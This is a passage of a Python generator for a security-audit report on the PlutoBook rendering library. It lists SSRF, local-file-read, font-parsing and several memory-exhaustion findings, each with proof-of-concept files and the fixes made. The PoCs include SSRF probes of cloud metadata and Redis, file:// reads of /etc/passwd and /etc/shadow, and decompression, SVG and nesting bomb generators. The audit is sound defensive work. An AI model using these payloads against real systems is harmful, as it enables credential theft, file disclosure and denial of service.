#!/usr/bin/env python3
# Generator for the PlutoBook security audit HTML report.
# Output: security-audit/{index.html, assets/style.css, Vxx-*/index.html, Vxx-*/poc/*}
# The generated HTML is static, self-contained (no CDN), readable by a human developer.
import html, os, pathlib

# ROOT = the security-audit/ folder. The script lives in security-audit/tools/, hence parents[1].
# Robust regardless of the working directory (local or cloud agent).
ROOT = pathlib.Path(__file__).resolve().parents[1]

SEV = {
    "critique": ("Critical", "sev-crit"),
    "haute":    ("High",    "sev-high"),
    "moyenne+": ("Medium+", "sev-medhigh"),
    "moyenne":  ("Medium",  "sev-med"),
    "basse":    ("Low",     "sev-low"),
    "info":     ("Info",     "sev-info"),
}

def esc(s): return html.escape(s, quote=False)

# ---------------------------------------------------------------------------
# Finding data (order = decreasing criticality = commit order)
# ---------------------------------------------------------------------------
F = []
def add(**k):
    # status: "todo" (needs fixing) or "done" (fixed). fixcommit: optional hash.
    k.setdefault("status", "todo")
    k.setdefault("fixcommit", "")
    F.append(k)

def status_html(f):
    if f["status"] == "done":
        c = f.get("fixcommit", "")
        extra = f' (<code>{esc(c)}</code>)' if c else ""
        return f'<span class="status-done">fixed</span>{extra}'
    return '<span class="status-todo">open</span>'

add(
 id="V01", slug="V01-ssrf", severity="critique", cat="SSRF / server-side forged request",
 title="SSRF &amp; unfiltered multi-scheme fetch",
 keyfile="source/resource/resource.cpp:284",
 locations=[
   ("source/resource/resource.cpp:275-324", "DefaultResourceFetcher::fetchUrl passes the raw URL to curl"),
   ("source/resource/resource.cpp:301-302", "CURLOPT_FOLLOWLOCATION=true, MAXREDIRS=30 by default"),
   ("source/document.cpp:1062-1075", "Document::fetchResource dispatches with no scheme validation"),
   ("include/plutobook.hpp:610-615", "defaults: verifyPeer/Host=true, followRedirects=true, timeout=300"),
 ],
 nature="""<p>The default fetcher builds a curl request using the <em>raw</em> URL taken from the document
 (<code>&lt;img src&gt;</code>, <code>&lt;link href&gt;</code>, CSS <code>url()</code>/<code>@import</code>,
 <code>@font-face src</code>, SVG <code>&lt;image href&gt;</code>):</p>
 <pre><code>curl_easy_setopt(curl, CURLOPT_URL, url.data());   // resource.cpp:284
curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, m_followRedirects); // 301, default true
curl_easy_perform(curl);                             // 305</code></pre>
 <p>Neither <code>CURLOPT_PROTOCOLS_STR</code> nor <code>CURLOPT_REDIR_PROTOCOLS_STR</code> is set
 (grepping the whole repo turns up 0 results). Depending on the build, libcurl's default protocol set
 includes <code>file</code>, <code>ftp</code>, <code>gopher</code>, <code>dict</code>, <code>tftp</code>,
 <code>scp</code>, <code>smb</code>, <code>ldap</code>&hellip; No destination address filtering at all.</p>""",
 risk="""<p>A hostile document forces PlutoBook to issue requests toward internal targets:</p>
 <ul>
   <li>Cloud metadata: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
       &rarr; credential theft.</li>
   <li>Internal services via <code>gopher://</code>/<code>dict://</code> (e.g. Redis <code>127.0.0.1:6379</code>).</li>
   <li>Redirect bypass: <code>http://attacker/x.png</code> returns <code>302 Location: gopher://&hellip;</code>
       or <code>file:///etc/passwd</code>; since <code>FOLLOWLOCATION</code> is on and redirect protocols
       aren't restricted, curl follows it.</li>
 </ul>
 <p><strong>Impact</strong>: scanning/interacting with the internal network, secret exfiltration. Critical
 when rendering untrusted HTML server-side.</p>""",
 repro=[
   "Start a fake local service (e.g. <code>python3 poc/listener.py</code>, which logs every connection on :8081).",
   "Render <code>poc/repro.html</code> with PlutoBook (library or CLI).",
   "Observe that PlutoBook connects to 127.0.0.1:8081 / 169.254.169.254 even though the document comes from an untrusted source.",
 ],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>SSRF PoC</title></head>
<body>
  <!-- Each resource triggers an unfiltered outgoing request -->
  <img src="http://127.0.0.1:8081/ssrf-probe">
  <img src="http://169.254.169.254/latest/meta-data/">
  <link rel="stylesheet" href="gopher://127.0.0.1:6379/_INFO%0d%0a">
  <p>If PlutoBook attempts these requests, the SSRF is confirmed.</p>
</body></html>
""",
  "listener.py": """#!/usr/bin/env python3
# Listens on 127.0.0.1:8081 and logs every connection (proof of SSRF).
import socketserver
class H(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request.recv(2048)
        print("[SSRF] connection received:", self.client_address, data[:80])
with socketserver.TCPServer(("127.0.0.1", 8081), H) as s:
    print("SSRF listener on 127.0.0.1:8081"); s.serve_forever()
""",
 },
 fix="""<p>Filter schemes at the fetch point and harden curl:</p>
 <ul>
   <li>Allowlist applied in <code>DefaultResourceFetcher::fetchUrl</code> +
       <code>CURLOPT_PROTOCOLS_STR</code>/<code>CURLOPT_REDIR_PROTOCOLS_STR</code> = <code>http,https</code>.</li>
   <li>URL validator hook (see below) invoked before any fetch.</li>
   <li>Optional filtering of internal addresses via <code>CURLOPT_PREREQFUNCTION</code>.</li>
 </ul>""",
 config="""Default: allowed schemes = <code>http,https,data</code>. Dangerous schemes can be explicitly
 re-enabled via <code>ResourceFetcher::setAllowedProtocols(&hellip;)</code>. URL validator via
 <code>setUrlValidator(cb)</code>, covering both the curl fetcher AND a custom handler.""",
 status="done",
)

add(
 id="V02", slug="V02-local-file-read", severity="critique", cat="Local file disclosure",
 title="Local file read via file:// + path traversal",
 keyfile="source/resource/url.cpp:568-575",
 locations=[
   ("source/resource/resource.cpp:380-386", "baseUrl() = process CWD as file://"),
   ("source/resource/url.cpp:568-575", "Url::complete accepts absolute file: paths"),
   ("source/resource/url.cpp:505-539", "normalization of .. (correct, but still resolves to an absolute path)"),
   ("source/resource/resource.cpp:331-367", "non-curl branch: direct read of any file://"),
 ],
 nature="""<p>The default base URL is the process's current working directory encoded as <code>file://</code>
 (<code>resource.cpp:380-386</code>). Relative URLs therefore resolve against the local filesystem, and
 absolute <code>file://</code> URLs are accepted as-is. There is no cross-scheme policy: a document
 served via <code>http://</code> can reference <code>file://</code>.</p>""",
 risk="""<p><code>&lt;link rel=stylesheet href="file:///etc/passwd"&gt;</code>,
 <code>&lt;img src="file:///proc/self/environ"&gt;</code>,
 <code>@font-face{src:url(file:///etc/shadow)}</code>: the content is pulled into the pipeline (stylesheet
 text parsed, image/font bytes decoded) and can end up reflected in the PDF/PNG output.
 Normalizing <code>..</code> does not prevent reaching an absolute path.
 <strong>Impact</strong>: reading/exfiltrating arbitrary local files.</p>""",
 repro=[
   "Render <code>poc/repro.html</code> with PlutoBook from any directory.",
   "Observe that the content of /etc/hostname (image) or a local file (CSS) gets loaded.",
 ],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8">
  <!-- Reads an arbitrary local stylesheet -->
  <link rel="stylesheet" href="file:///etc/passwd">
</head><body>
  <!-- Relative traversal to a file outside the document's folder -->
  <img src="../../../../../../etc/hostname">
  <p>If the local file is loaded, the disclosure is confirmed.</p>
</body></html>
""",
 },
 fix="""<p>Introduces a top-level / sub-resource trust model:
 <code>ResourceLoader::loadUrl</code> now takes a <code>trusted</code> flag (default
 <code>false</code>), propagated to <code>DefaultResourceFetcher::fetchUrl(url, trusted)</code>
 (new non-pure virtual overload on <code>ResourceFetcher</code>; the old single-argument signature
 is unchanged and means <code>trusted=false</code>). <code>Book::loadUrl</code> (so
 <code>html2pdf</code>/<code>html2png</code> on a local file) passes <code>trusted=true</code>: the
 scheme allowlist and the internal-IP filter do not apply to the top-level document, which keeps
 the scheme explicitly requested by the caller. All sub-resources
 (<code>Document::fetchResource</code>: images, stylesheets, fonts, SVG references) go through the
 <code>trusted=false</code> default and remain filtered by the allowlist (so <code>file://</code>
 and <code>../</code> traversal to an absolute <code>file://</code> path are rejected). The URL
 validator (V01) applies in both cases, on the resolved URL. Redirects are still always capped to
 <code>http,https</code> regardless of the trust level or the configured allowlist. Same treatment
 applied to the non-curl branch.</p>""",
 config="""Default: <code>file://</code> disabled for sub-resources only (the top-level document
 explicitly loaded by the caller, e.g. <code>html2pdf file.html</code>, is not subject to the
 allowlist). Re-enable <code>file://</code> for sub-resources via
 <code>setAllowedProtocols(&hellip;, "file")</code>. Optional confinement to a root directory via
 the URL validator.""",
 status="done",
)

add(
 id="V03", slug="V03-font-freetype", severity="haute", cat="RCE surface (font parsing)",
 title="Raw font bytes passed straight to FreeType/brotli",
 keyfile="source/resource/fontresource.cpp:57",
 locations=[
   ("source/resource/fontresource.cpp:46-63", "FT_New_Memory_Face on raw bytes"),
   ("source/resource/fontresource.cpp:90", "FcFreeTypeCharSet walks the face"),
   ("source/resource/fontresource.cpp:99-104", "supportsFormat only filters on the CSS format() hint"),
 ],
 nature="""<p>Bytes fetched from <code>@font-face{src:url(&hellip;)}</code> (any scheme) are passed
 straight to FreeType with no magic-byte check, no size check, and no format allowlist:</p>
 <pre><code>FT_New_Memory_Face(ftLibrary, (FT_Byte*)resource.content(),
                   resource.contentLength(), 0, &amp;ftFace);  // fontresource.cpp:57</code></pre>
 <p>If FreeType is built with brotli, the WOFF2 path routes these bytes through brotli + sfnt
 reconstruction (a path with a long history of bugs).</p>""",
 risk="""<p><strong>Impact</strong>: RCE-class memory corruption, reducible to any CVE in the linked
 FreeType/brotli version, reachable from a plain document. PlutoBook adds no pre-validation layer of
 its own.</p>""",
 repro=[
   "Host/point to a malformed or oversized font via @font-face.",
   "Render poc/repro.html: the bytes are parsed by FreeType regardless of the declared format.",
   "Under ASan, fuzz the font to exercise the parser (this documents the attack surface, not a specific PlutoBook bug).",
 ],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>
  @font-face { font-family: x; src: url("poc/evil.ttf") format("truetype"); }
  body { font-family: x; }
</style></head><body>Text rendered with an untrusted font.</body></html>
""",
  "make-evil-font.py": """#!/usr/bin/env python3
# Builds a malformed 'evil.ttf' file (truncated sfnt header) to exercise the FreeType parser.
# Goal: show that PlutoBook parses arbitrary bytes with no pre-validation.
open("evil.ttf","wb").write(b"\\x00\\x01\\x00\\x00" + b"\\x00"*8 + b"\\xff"*64)
print("evil.ttf written (fuzz it under ASan)")
""",
 },
 fix="""<p><code>FTFontData::create</code> (<code>source/resource/fontresource.cpp</code>) now checks,
 before any call to <code>FT_New_Memory_Face</code>: (1) that the received byte size &le;
 <code>DefaultResourceFetcher::maxFontBytes()</code>; (2) that the first 4 bytes match a known font
 signature (sfnt <code>0x00010000</code>, <code>OTTO</code>, <code>true</code>, <code>typ1</code>,
 <code>ttcf</code> collection, <code>wOFF</code>, <code>wOF2</code>). On failure: a clean error
 message via <code>plutobook_set_error_message</code>, <code>nullptr</code> returned (falls back to
 system fonts), no bytes ever reach FreeType/brotli. The check is enforced at the single point
 where font bytes are about to be parsed, so it applies regardless of the source (default curl/file
 fetcher or a custom <code>ResourceFetcher</code>) -- independent of <code>supportsFormat</code>,
 which only filters on the CSS <code>format()</code> hint and can lie.</p>""",
 config="""<code>DefaultResourceFetcher::setMaxFontBytes(size_t)</code> knob (member
 <code>m_maxFontBytes</code>, default 8&nbsp;MiB) + <code>maxFontBytes()</code> accessor. Fixed
 magic-byte allowlist (not configurable, pure security fix).""",
 status="done",
)

add(
 id="V04", slug="V04-download-size", severity="haute", cat="Denial of service (memory)",
 title="No download size limit",
 keyfile="source/resource/resource.cpp:268-273",
 locations=[
   ("source/resource/resource.cpp:268-273", "writeCallback inserts with no cap"),
   ("source/resource/resource.cpp:275-324", "no CURLOPT_MAXFILESIZE"),
 ],
 nature="""<pre><code>static size_t writeCallback(const char* contents, size_t bs, size_t nb, ByteArray* r) {
    size_t total = bs * nb;
    r-&gt;insert(r-&gt;end(), contents, contents + total);  // unbounded growth
    return total;
}</code></pre>
 <p>The entire body is buffered in a <code>std::vector&lt;char&gt;</code>. Neither
 <code>CURLOPT_MAXFILESIZE_LARGE</code> nor a cap in the callback.</p>""",
 risk="""<p>A server using <em>chunked encoding</em> can serve gigabytes (default timeout 300s). N distinct
 URLs = N concurrent buffers (dedup only applies to identical URLs, <code>document.cpp:1066</code>).
 <strong>Impact</strong>: memory exhaustion &rarr; process gets killed (DoS).</p>""",
 repro=[
   "Start poc/huge-server.py (responds with an endless stream).",
   "Render poc/repro.html, which references http://127.0.0.1:8082/huge.",
   "Watch RAM usage grow without bound.",
 ],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body><img src="http://127.0.0.1:8082/huge"><p>OOM if there is no cap.</p></body></html>
""",
  "huge-server.py": """#!/usr/bin/env python3
# Serves an 'infinite' stream to prove there is no download size cap.
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","image/png"); self.end_headers()
        chunk = b"\\x00" * (1<<20)
        try:
            while True: self.wfile.write(chunk)   # never finishes
        except BrokenPipeError: pass
HTTPServer(("127.0.0.1",8082), H).serve_forever()
""",
 },
 fix="""<p><code>DefaultResourceFetcher::fetchUrl</code> now sets <code>CURLOPT_MAXFILESIZE_LARGE</code>
 (immediate rejection if an advertised size, e.g. <code>Content-Length</code>, exceeds the cap) and
 <code>CURLOPT_CONNECTTIMEOUT</code>. <code>CURLOPT_MAXFILESIZE_LARGE</code> only checks a size
 <em>known in advance</em>; a <em>chunked encoding</em> response advertises none and can therefore
 bypass it entirely. To close this gap, <code>CURLOPT_WRITEDATA</code> now points to a small
 <code>WriteCallbackContext</code> struct (<code>ByteArray*</code> + cap) instead of a bare
 <code>ByteArray*</code>: <code>writeCallback</code> thus knows the cap and, as soon as the
 accumulated size would exceed it, returns a short count (0) &mdash; which curl treats as a write
 error and aborts the transfer immediately (<code>CURLE_WRITE_ERROR</code>), regardless of the
 transfer shape (chunked or not). Both failure codes (<code>CURLE_FILESIZE_EXCEEDED</code> and
 <code>CURLE_WRITE_ERROR</code>) are translated into a clear, specific error message (max size
 exceeded) instead of the generic <code>curl_easy_strerror</code>. The non-curl branch (local file
 read via <code>tellg</code>) does not apply this cap: the size is known in advance there and read
 in a single bounded allocation, which doesn't match the threat model (endless remote stream);
 adding a cap there would risk silently truncating a legitimate large local file for no matching
 benefit.</p>""",
 config="""<code>DefaultResourceFetcher::setMaxDownloadSize(size_t)</code> knob (member
 <code>m_maxDownloadSize</code>, default 32&nbsp;MiB; <code>0</code> = unlimited) and
 <code>setConnectTimeout(int)</code> (member <code>m_connectTimeout</code>, default 30&nbsp;s).""",
 status="done",
)

add(
 id="V05", slug="V05-image-bomb", severity="haute", cat="Denial of service (memory)",
 title="Image decompression bomb (no pixel budget)",
 keyfile="source/resource/imageresource.cpp:100-193",
 locations=[
   ("source/resource/imageresource.cpp:92-99", "PNG via libpng/cairo: cairo_image_surface_create_from_png_stream directly, no cap (the path actually taken whenever cairo is built with PNG support -- the case in this repo -- since STBI_NO_PNG is then defined)"),
   ("source/resource/imageresource.cpp:162-169", "stb (PNG if CAIRO_HAS_PNG_FUNCTIONS is absent, otherwise GIF/BMP/TGA/...): STBI_MAX_DIMENSIONS=1<<24, no total pixel cap"),
   ("source/resource/imageresource.cpp:100-124", "turbojpeg: width/height unbounded going into cairo"),
   ("source/resource/imageresource.cpp:139", "webp: config.input.width/height passed straight to cairo"),
 ],
 nature="""<p>There is no overall pixel budget. stb only bounds each axis (<code>1&lt;&lt;24</code>) and the
 allocation overflow (~2 GB); a PNG of a few KB at ~23000&times;23000 decompresses to ~2 GB of RGBA.
 turbojpeg accepts up to 65535&sup2; (~17 GB), webp up to 16383&sup2; (~1 GB), passed straight to
 <code>cairo_image_surface_create</code>. In this repo, <code>cairo</code> is built with native PNG
 support (<code>CAIRO_HAS_PNG_FUNCTIONS</code>), so <code>STBI_NO_PNG</code> is active and a PNG never
 goes through stb: it is decoded directly by
 <code>cairo_image_surface_create_from_png_stream</code> (libpng), a fourth, unbounded path that the
 <code>make-bomb.py</code> PoC actually exercises.</p>""",
 risk="<p><strong>Impact</strong>: memory exhaustion from a tiny image (DoS).</p>",
 repro=[
   "Generate the bomb: <code>python3 poc/make-bomb.py</code> (creates bomb.png, ~23000x23000, a few KB).",
   "Render poc/repro.html, which displays it &rarr; ~2 GB allocated.",
 ],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body><img src="poc/bomb.png"><p>~2 GB decompressed from a few KB.</p></body></html>
""",
  "make-bomb.py": """#!/usr/bin/env python3
# Creates an all-black 23000x23000 PNG (compresses to a few KB, ~2 GB decompressed).
import zlib, struct
W = H = 23000
def chunk(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t+d) & 0xffffffff)
raw = bytearray()
row = b"\\x00" + b"\\x00\\x00\\x00" * W          # filter 0 + black RGB pixels
for _ in range(H): raw += row
png = b"\\x89PNG\\r\\n\\x1a\\n"
png += chunk(b"IHDR", struct.pack(">IIBBBBB", W, H, 8, 2, 0, 0, 0))
png += chunk(b"IDAT", zlib.compress(bytes(raw), 9))
png += chunk(b"IEND", b"")
open("bomb.png","wb").write(png)
print("bomb.png written:", len(png), "bytes for", W, "x", H)
""",
 },
 fix="""<p>A pixel budget (<code>width &times; height</code>) is now applied <strong>before</strong> any
 full-decode allocation, on all <strong>four</strong> paths of <code>decodeBitmapImage</code>:</p>
 <ul>
   <li>PNG via cairo/libpng: the IHDR (width/height, always the first 8 bytes after the PNG
       signature) is read directly -- without invoking the full decoder -- before calling
       <code>cairo_image_surface_create_from_png_stream</code>.</li>
   <li>turbojpeg: checked right after <code>tjDecompressHeader</code>, before
       <code>cairo_image_surface_create</code>.</li>
   <li>webp: checked right after <code>WebPGetFeatures</code>, before
       <code>cairo_image_surface_create</code>.</li>
   <li>stb (GIF/BMP/TGA/&hellip;, and PNG if <code>cairo</code> is built without PNG support):
       <code>stbi_info_from_memory</code> is called before <code>stbi_load_from_memory</code> to get
       the dimensions without decoding the pixels.</li>
 </ul>
 <p>All four call a shared <code>checkImagePixelBudget(width, height)</code> function that reads
 <code>DefaultResourceFetcher::maxImagePixels()</code> -- a global accessor, same pattern as
 <code>maxFontBytes()</code> (V03), since the image decoder has no direct reference to the fetcher --
 and fails cleanly (<code>plutobook_set_error_message</code> + <code>nullptr</code> return) without
 ever allocating the full-size buffer/surface. As defense in depth,
 <code>STBI_MAX_DIMENSIONS</code> is also lowered from <code>1&lt;&lt;24</code> (~16.7 M) to
 <code>65535</code> via <code>#define</code> before including <code>stb_image.h</code>.</p>""",
 config="""<code>DefaultResourceFetcher::setMaxImagePixels(uint64_t)</code> knob (member
 <code>m_maxImagePixels</code>, default 64&nbsp;MP = <code>64ULL*1000*1000</code>; <code>0</code> =
 unlimited) + <code>maxImagePixels()</code> accessor.""",
 status="done",
)

add(
 id="V06", slug="V06-table-colspan", severity="haute", cat="Denial of service (memory)",
 title="Unbounded table colspan / col span",
 keyfile="source/layout/tablebox.cpp:1389",
 locations=[
   ("source/htmldocument.cpp:858-861", "colSpan() only clamps the minimum (1)"),
   ("source/layout/tablebox.cpp:1389-1400", "loop emplaces col < colSpan() into a pmr::map"),
   ("source/layout/tablebox.cpp:439-443", "col/colgroup span: emplace_back in a loop"),
   ("source/layout/tablebox.cpp:1364-1376", "rowSpan IS correctly clamped (a model to replicate)"),
 ],
 nature="""<p><code>HTMLTableCellElement::colSpan()</code> only bounds the minimum (1), not the maximum
 (the HTML spec caps it at 1000). The value feeds a loop that <code>emplace</code>s into a
 <code>std::pmr::map</code> (nodes are never freed, see the monotonic Heap) and grows the
 <code>columns</code> vector.</p>""",
 risk="""<p><code>&lt;td colspan=200000000&gt;</code> &rarr; up to ~4.3e9 never-freed allocations. Same
 for <code>&lt;colgroup span=&hellip;&gt;</code>. <strong>Impact</strong>: OOM.</p>""",
 repro=["Render poc/repro.html &rarr; memory explosion while building the table."],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body><table><tr><td colspan="200000000">x</td></tr></table></body></html>
""",
 },
 fix="""<p><code>HTMLTableCellElement::colSpan()</code>/<code>rowSpan()</code> and
 <code>HTMLTableColElement::span()</code> (<code>source/htmldocument.cpp</code>) now cap the raw
 attribute value via a <code>clampTableSpanMax()</code> helper (and <code>clampTableSpan()</code>,
 which also applies the existing minimum of 1) before it ever reaches <code>tablebox.cpp</code>: the
 <code>emplace</code> loop (<code>:1389-1400</code>) and the <code>col</code>/<code>colgroup</code>
 <code>span</code> loop (<code>:439-443</code>) are unchanged but never see an unbounded value again.
 <code>rowSpan()</code> keeps the spec value <code>0</code> ("extend to the end of the row group") --
 only the maximum is applied to it, not the minimum -- and is otherwise already bounded by the
 actual row count in <code>TableSectionBox::build()</code> (<code>:1364-1376</code>, the model this
 fix follows).</p>""",
 config="""New reusable configuration facade <strong>EngineLimits</strong>
 (<code>include/plutobook.hpp</code> + <code>include/plutobook.h</code>), reached through the global
 singleton <code>plutobook::engineLimits()</code> (same style as
 <code>plutobook::defaultResourceFetcher()</code>): <code>setMaxTableSpan(uint32_t)</code> /
 <code>maxTableSpan()</code>, <strong>default 1000</strong> (HTML spec value), <code>0</code> =
 unlimited. Matching C API: <code>plutobook_set_max_table_span(unsigned int)</code>. This will be the
 anchor point for future engine limits (V07-V12: nesting depth, <code>&lt;use&gt;</code> expansion
 budget, page count, counter length, <code>column-count</code>) -- see section C of the fix guide.""",
 status="done",
)

add(
 id="V07", slug="V07-svg-use", severity="haute", cat="Denial of service (memory/CPU)",
 title="Exponential SVG &lt;use&gt; expansion (billion laughs)",
 keyfile="source/svgdocument.cpp:336-406",
 locations=[
   ("source/svgdocument.cpp:336-406", "SVGUseElement::finishParsingDocument clones + re-descends"),
   ("source/svgdocument.cpp:379-386", "guard limited to cycles via same-id ancestor"),
   ("source/svgdocument.cpp:788,900,954", "contrast: gradient/pattern have a std::set guard"),
 ],
 nature="""<p><code>&lt;use&gt;</code> clones the target subtree and re-descends into the cloned children.
 The only guard blocks cycles <em>via a same-id ancestor</em>, but not <em>fan-out</em> between siblings.
 A doubling ladder produces 2^N nodes from an O(N) SVG, all bump-allocated and never freed.</p>""",
 risk="<p><strong>Impact</strong>: OOM/hang from a tiny SVG.</p>",
 repro=[
   "Generate: <code>python3 poc/make-svg-bomb.py</code> (30 levels).",
   "Render bomb.svg &rarr; 2^30 instantiations.",
 ],
 poc={
  "make-svg-bomb.py": """#!/usr/bin/env python3
# <use> doubling ladder: N levels -> 2^N instantiated nodes.
N = 30
out = ['<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">']
out.append('<g id="x0"><rect width="1" height="1"/></g>')
for i in range(1, N+1):
    out.append(f'<g id="x{i}"><use xlink:href="#x{i-1}"/><use xlink:href="#x{i-1}"/></g>')
out.append(f'<use xlink:href="#x{N}"/></svg>')
open("bomb.svg","w").write("\\n".join(out))
print(f"bomb.svg written: {N} levels -> 2^{N} nodes")
""",
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body><img src="poc/bomb.svg" width="100"></body></html>
""",
 },
 fix="""<p><code>&lt;use&gt;</code> expansion budget: a cap on the total number of instantiated nodes AND
 on depth (see V08), mirroring the <code>std::set</code> guard used for gradients/patterns.</p>""",
 config="Configurable via <code>EngineLimits</code>: <code>setMaxUseExpansion</code> (default 100000 nodes) and <code>setMaxUseDepth</code> (default 512); C API <code>plutobook_set_max_use_expansion</code>/<code>_depth</code>.",
 status="done",
)

add(
 id="V08", slug="V08-recursion", severity="haute", cat="Denial of service (stack overflow)",
 title="Unbounded recursion: CSS parsing, layout, paint, destruction",
 keyfile="source/csstokenizer.h:173",
 locations=[
   ("source/csstokenizer.h:173-206", "consumeComponent recurses one frame per nested ( [ {"),
   ("source/cssparser.cpp:740-858", "consumePseudoSelector: nested :is()/:not()/:where()/:has()"),
   ("source/cssparser.cpp:365-373", "nested at-rules @media{@media{...}}"),
   ("source/document.cpp:267,236", "finishParsingDocument / cloneChildren recurse by depth"),
   ("source/layout/blockbox.cpp:1541", "recursive layout; source/layout/box.cpp:37 recursive destruction"),
 ],
 nature="""<p>There is no depth limit anywhere. Vectors: CSS token blocks
 (<code>((((&hellip;</code>, <code>[[[[&hellip;</code>), nested functional pseudo-classes
 (<code>:not(:not(&hellip;))</code>), nested at-rules, and above all deep trees: HTML parsing is
 iterative, but finalization, cloning, <em>layout</em>, paint, and <em>destruction</em>
 (<code>~Box</code>) all recurse by depth.</p>""",
 risk="<p><code>&lt;div&gt;</code>&times;200000 or <code>((((&hellip;</code> (200k) &rarr; stack overflow &rarr; SIGSEGV (DoS).</p>",
 repro=[
   "Generate: <code>python3 poc/make-deep.py</code> (creates deep.html and deep.css).",
   "Render each file &rarr; crash from stack overflow.",
 ],
 poc={
  "make-deep.py": """#!/usr/bin/env python3
# Two vectors: nested elements and nested CSS blocks.
open("deep.html","w").write("<!DOCTYPE html><html><body>" + "<div>"*200000 + "x" + "</div>"*200000 + "</body></html>")
open("deep.css.html","w").write("<!DOCTYPE html><html><head><style>a:" + "("*200000 + "</style></head><body>x</body></html>")
print("deep.html and deep.css.html written")
""",
 },
 fix="""<p>Shared depth counter, checked in <code>CSSTokenStream::consumeComponent</code>
 (<code>csstokenizer.h</code>/<code>.cpp</code>, thread_local) for token-block recursion
 (<code>((((&hellip;</code>, <code>:not(:not(&hellip;))</code>); in <code>CSSParser::NestingScope</code>
 (RAII, member <code>m_nestingDepth</code>) for selector recursion (<code>consumeSelectorList</code>,
 called back from <code>consumePseudoSelector</code>) and at-rules (<code>consumeRuleList</code>,
 called back from <code>consumeMediaRule</code>). Past the limit: recursion stops, the construct is
 treated as a parse error (no crash, no UB).</p>
 <p>On the tree side: depth is bounded <strong>at parse time</strong>, not in the downstream
 recursive passes. HTML: an initial fix only bounded the DOM attachment point
 (<code>currentInsertionParent()</code>), leaving the <code>HTMLElementStack</code>
 (<code>m_openElements</code>) itself to grow without bound; but this stack is scanned end-to-end by
 essentially every scope check in the HTML5 algorithm (<code>inScope</code>,
 <code>inTableScope</code>, <code>inButtonScope</code>, ...), run on every token -- so that first fix
 removed the stack-overflow crash but not the <code>O(depth)</code> cost of these checks, which
 stayed quadratic in practice (<code>&lt;div&gt;</code>x200000 no longer crashed but took &gt;60s).
 The final fix bounds <strong>the stack itself</strong> (<code>HTMLParser::pushElement()</code>):
 once <code>maxNestingDepth()</code> elements are open, any further opening tag is still created and
 inserted into the DOM (content preserved, becomes a sibling of the element at the cap rather than a
 descendant) but is no longer pushed onto the stack -- so the scope checks stay bounded at
 <code>O(maxNestingDepth)</code> regardless of the total tag count. The insertion-mode transitions
 that normally accompany a <code>push</code> (entering table/select/frameset/... mode) are gated on
 that push succeeding, so the state machine never believes it is "inside" an element that isn't
 actually open -- which would otherwise fail the scope-consistency <code>assert</code>s (e.g. "a
 td/th is in table scope" in InCell mode). Likewise, the few places where the algorithm inserts an
 implied tag and then reprocesses the token (e.g. an implied <code>&lt;tbody&gt;</code> before a
 stray <code>&lt;tr&gt;</code>) only reprocess if that implied insertion actually happened, otherwise
 the token is dropped instead of looping forever on the same never-pushed implied tag. The
 <code>&lt;title&gt;/&lt;style&gt;/&lt;script&gt;/&lt;textarea&gt;/&lt;xmp&gt;/&lt;iframe&gt;/&lt;noembed&gt;</code>
 elements are exempt from the cap: once the tokenizer switches to RCDATA/RAWTEXT/script-data state,
 it recognizes nothing but their own matching end tag, so they can never nest within themselves to
 defeat the limit. XML/SVG (same expat handlers): real depth tracked symmetrically in
 <code>XMLParser::handleStartElement</code>/<code>handleEndElement</code>; <code>m_currentNode</code>
 only advances/retreats while this depth stays under the cap, with the same fixed-ancestor
 attachment logic beyond it (no scope stack equivalent to <code>HTMLElementStack</code> to bound on
 the XML side). Since the resulting DOM's depth is thus bounded, the downstream recursive passes
 (<code>finishParsingDocument</code>, layout, paint, <code>~Box</code> destruction) are bounded too,
 with no separate counter needed in each.</p>""",
 config="""New <code>EngineLimits::maxNestingDepth</code> limit (<code>setMaxNestingDepth</code> /
 <code>maxNestingDepth()</code>), <strong>default 512</strong>, <code>0</code> = unlimited. C API
 <code>plutobook_set_max_nesting_depth(unsigned int)</code>. Verified: <code>&lt;div&gt;</code>x200000
 goes from &gt;60s (timeout) to ~11s (unoptimized debug build; &lt;1s in a release build), and a
 lower cap (e.g. 20 via a test harness) stays fast on much deeper input, confirming complexity is
 now linear. <em>Known limitation, out of scope</em>: beyond the cap, a very deeply nested table
 (e.g. <code>&lt;table&gt;&lt;tr&gt;&lt;td&gt;</code> repeated 2000 times) no longer crashes or
 hangs, but can still be very slow -- table <em>layout</em> (intrinsic-width computation for nested
 tables), not <em>parsing</em>, already has an exponential cost in real nesting depth
 <strong>even before this fix</strong> (confirmed present on the unmodified base); not fixed here
 (outside V08's recursion/stack scope -- a candidate for a future table-layout-specific fix).""",
 status="done",
)

add(
 id="V09", slug="V09-page-count", severity="moyenne+", cat="Memory DoS + UB",
 title="Page count proportional to height + float&rarr;uint UB",
 keyfile="source/layout/pagebox.cpp:694-723",
 locations=[
   ("source/layout/pagebox.cpp:694-723", "pageCount = ceil(height/containerHeight), 1 PageBox per page"),
   ("source/counters.cpp:16", "float->uint32_t conversion (UB if > UINT32_MAX)"),
 ],
 nature="""<p>The page count is <code>ceil(height / containerHeight)</code>; a loop builds one
 <code>PageBox</code> (+ margin boxes, never freed) per page. Moreover, <code>ceil(hugeFloat)</code>
 exceeding <code>UINT32_MAX</code> converted to <code>uint32_t</code> is undefined behavior.</p>""",
 risk="<p><code>html{height:1e9px}</code> with a small <code>@page</code> &rarr; millions/billions of pages &rarr; OOM.</p>",
 repro=["Render poc/repro.html to PDF &rarr; page count explosion."],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>
  @page { size: 20px 20px; margin: 0; }
  html { height: 1000000000px; }
</style></head><body>x</body></html>
""",
